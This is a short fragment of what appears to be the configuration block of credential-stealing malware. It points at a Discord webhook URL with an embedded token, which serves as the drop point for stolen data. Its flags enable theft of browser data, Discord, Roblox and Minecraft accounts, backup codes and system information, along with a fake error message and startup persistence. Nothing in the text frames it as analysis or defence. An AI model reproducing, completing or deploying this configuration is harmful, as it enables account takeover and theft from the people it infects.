...
__CONFIG__ = {'webhook': 'https://discordapp.com/api/webhooks/1170866574673072198/1KH7C_67adW3tQhnd_UHMRztGz7-iD85TdF0O8oSU_tDC9-SMndhlhG_aAOEwwPCBspN', 'ping': True, 'pingtype': 'Here', 'fakeerror': True, 'startup': True, 'defender': False, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': True, 'wifi': False, 'killprotector': False, 'antidebug_vm': False, 'discord': True, 'anti_spam': True, 'self_destruct': False, 'clipboard': False}
